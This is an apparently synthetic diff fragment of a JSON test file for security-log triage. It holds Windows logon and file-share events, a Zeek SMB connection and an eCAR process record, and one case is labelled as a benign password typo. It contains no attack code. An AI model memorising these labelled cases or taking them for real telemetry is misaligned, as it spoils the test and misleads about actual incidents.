+      {"src": "win", "host": "WS-MTAYLOR-01", "ts": "2026-05-10T15:04:02.881Z", "event_id": 5145, "channel": "Security", "data": {"ShareName": "\\\\FILE-BO-01\\Finance", "RelativeTargetName": "Q1-budget.xlsx", "SubjectUserName": "mtaylor"}},
+      {"src": "zeek_conn", "uid": "C30s1", "ts": 1778423040.0, "orig_h": "10.20.3.90", "orig_p": 51222, "resp_h": "10.20.2.20", "resp_p": 445, "orig_bytes": 18422, "resp_bytes": 992010, "state": "SF"}
+    ]
+  },
+  {
+    "id": "CASE-031-BENIGN-PASSWORD-TYPO",
+    "target": "WS-KORAM-01",
+    "events": [
+      {"src": "win", "host": "WS-KORAM-01", "ts": "2026-05-10T09:05:11.001Z", "event_id": 4625, "channel": "Security", "data": {"TargetUserName": "koram", "LogonType": "2", "Status": "0xc000006a"}, "repeat": 3, "ts_step": 6},
+      {"src": "win", "host": "WS-KORAM-01", "ts": "2026-05-10T09:05:41.220Z", "event_id": 4624, "channel": "Security", "data": {"TargetUserName": "koram", "LogonType": "2", "LogonProcessName": "User32"}},
+      {"src": "ecar", "host": "WS-KORAM-01", "ts_ms": 1778403941000, "id": "ecar-031-01", "object": "PROCESS", "action": "START", "actorID": "C:\\Windows\\System32\\userinit.exe", "objectID": "C:\\Program Files\\Microsoft Office\\root\\Office16\\TEAMS.EXE", "pid": 6610, "ppid": 4420, "principal": "NORTHSTAR\\koram", "props": {"command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\TEAMS.EXE\""}}
+    ]
+  }
+]
